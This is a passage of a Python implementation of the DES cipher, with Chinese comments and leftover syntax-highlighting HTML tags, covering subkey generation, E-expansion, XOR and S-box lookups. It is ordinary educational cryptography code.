operator">=</span> create_L0R0<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 得到c0,d0</span>    num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 设置第n次循环左移位数</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 将生成k1~k16的子密钥存放在列表k中</span>        c0 <span class="token operator">=</span> my_move<span class="token punctuation">(</span>c0<span class="token punctuation">,</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        d0 <span class="token operator">=</span> my_move<span class="token punctuation">(</span>d0<span class="token punctuation">,</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        k1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        k1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>c0<span class="token punctuation">)</span>        k1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>d0<span class="token punctuation">)</span>        pc_2 <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"PC-2.txt"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>        temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 暂时存放56位子密钥</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k1<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>pc_2<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        k<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">return</span> k<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment"># k位16x48的子密钥二维数组</span><span class="token keyword">def</span> <span class="token function">my_move</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#循环移位，n为移位数</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">##左移</span>        <span class="token builtin">list</span><span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token builtin">list</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">list</span><span class="token keyword">def</span> <span class="token function">E_extend</span><span class="token punctuation">(</span>R0<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#将32位Ri扩展位48位</span>    Ri <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"E_extend.txt"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            Ri<span class="token punctuation">.</span>append<span class="token punctuation">(</span>R0<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>e<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#print(Ri)</span>    <span class="token keyword">return</span> Ri<span class="token keyword">def</span> <span class="token function">yihuo</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#进行异或运算</span>    B <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        B<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span>  B<span class="token keyword">def</span> <span class="token function">create_B</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span>ERi<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#进行异或运算，K为48位子密钥列表，ERi为48位扩展的Ri,num是轮数</span>    B <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>K<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>K<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> K<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">==</span> ERi<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">:</span>                b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        B<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span>  B<span class="token punctuation">[</span>num<span class="token punctuation">]</span>    <span class="token comment">#返回值为B0~B7的集合列表B</span><span class="token keyword">def</span> <span class="token function">get_bi</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span>    b0 <span class="token operator">=</span> <span class="token string">''</span>    b1 <span class="token operator">=</span> <span class="token string">''</span>    b2 <span class="token operator">=</span> <span class="token string">''</span>    b3 <span class="token operator">=</span> <span class="token string">''</span>    b4 <span class="token operator">=</span> <span class="token string">''</span>    b5 <span class="token operator">=</span> <span class="token string">''</span>    b6 <span class="token operator">=</span> <span class="token string">''</span>    b7 <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b0 <span class="token operator">=</span> b0 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b1 <span class="token operator">=</span> b1 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b2 <span class="token operator">=</span> b2 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b3 <span class="token operator">=</span> b3 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b4 <span class="token operator">=</span> b4 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b5 <span class="token operator">=</span> b5 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b6 <span class="token operator">=</span> b6 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b7 <span class="token operator">=</span> b7 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>b0<span class="token punctuation">,</span>b1<span class="token punctuation">,</span>b2<span class="token punctuation">,</span>b3<span class="token punctuation">,</span>b4<span class="token punctuation">,</span>b5<span class="token punctuation">,</span>b6<span class="token punctuation">,</span>b7<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_lastR</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span>R0<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#num为轮数</span>    ERi <span class="token operator">=</span> E_extend<span class="token punctuation">(</span>R0<span class="token punctuation">)</span>    <span class="token comment">#E扩展</span>    B <span class="token operator">=</span> create_B<span class="token punctuation">(</span>K<span class="token punctuation">,</span>ERi<span class="token punctuation">,</span>num<span class="token punctuation">)</span>    <span class="token comment">#num轮数用来控制Ki</span>    b0<span class="token punctuation">,</span>b1<span class="token punctuation">,</span>b2<span class="token punctuation">,</span>b3<span class="token punctuation">,</span>b4<span class="token punctuation">,</span>b5<span class="token punctuation">,</span>b6<span class="token punctuation">,</span>b7 <span class="token operator">=</span> get_bi<span class="token punctuation">(</span>B<span class="token punctuation">)</span>    b0 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b0<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    b1 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    b2 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    b3 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b3<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    b4 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b4<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>    b5 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b5<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>    b6 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b6<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>    b7 <span class="token operator">=</span> cut_bi<span class="token punctuation">(</span>b7<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>    last_R <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b0<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b1<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b2<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b3<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b4<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b5<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b6<span class="token punctuation">)</span>    last_R<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b7<span class="token punctuation">)</span>    <span class="token keyword">return</span> last_R<span class="token keyword">def</span> <span class="token function">read_s</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box1.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box2.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box3.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box4.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box5.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box6.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> num<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box7.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"S_box8.txt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">cut_bi</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> my_int2<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> my_int4<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> read_s<span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    s <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    temp <span class="token operator">=</span> read_s<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>my_bin<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">my_int2</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> a1 <span class="token operator">+</span> a2    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">'00'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'01'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'10'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">my_int4</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">,</span>a3<span class="token punctuation">,</span>a4<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> a1 <span class="token operator">+</span> a2 <span class="token operator">+</span> a3 <span class="token operator">+</span> a4    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">'0000'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0001'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0010'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0011'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0100'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0101'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0110'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0111'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1000'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1001'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1010'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1011'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1100'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1101'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1110'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">my_bin</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0000'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0001'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0010'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0011'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0100'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0101'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0110'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0111'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>      a <span class="token operator">=</span> <span class="token string">'1000'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1001'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1010'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">11</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1011'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">12</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1100'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">13</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1101'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">14</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1110'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1111'</span>    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">list</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">list</span>K <span class="token operator">=</span> child_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取k1~k16的子密钥存依次放在列表K中</span>L0<span class="token punctuation">,</span>R0 <span class="token operator">=</span> create_L0R0<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取L0,R0</span><span 